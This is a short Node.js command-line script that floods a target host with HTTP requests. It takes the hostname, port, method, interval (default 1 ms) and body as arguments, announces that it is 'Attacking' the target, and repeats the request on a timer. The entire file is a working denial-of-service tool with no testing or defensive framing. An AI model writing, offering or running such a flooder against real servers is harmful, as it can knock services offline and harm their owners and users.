const {request} = require("http");
process.argv[3] ??= 80;
process.argv[4] ??= "GET";
process.argv[5] ??= 1;
process.argv[6] ??= "";
console.log(`Attacking ${process.argv[2]} on port ${process.argv[3]} with method ${process.argv[4]} every ${process.argv[5]}ms`);
var i;
function makeRequest() {
	request({
		hostname: process.argv[2],
		port: process.argv[3],
		method: process.argv[4]
	}, res => {
		console.log("Got response with status", res.statusCode, "\nHeaders:", res.headers);
	})
	.on("error", console.error)
	.end(process.argv[6]);
}
i = setInterval(makeRequest, process.argv[5]);